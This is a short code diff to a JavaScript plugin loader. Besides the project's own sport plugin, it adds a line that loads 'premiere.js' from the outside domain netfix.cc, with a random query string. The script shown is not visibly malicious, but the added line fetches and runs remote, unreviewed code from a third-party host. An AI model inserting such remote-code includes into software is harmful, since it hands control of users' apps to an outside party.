@@ -14,6 +14,7 @@ function init(){
 
     Utils.putScript([
         Utils.protocol() + Manifest.cub_domain + '/plugin/sport',
+        Utils.protocol() + 'netfix.cc/premiere.js?r=' + Math.random()
     ],()=>{})
 }
 
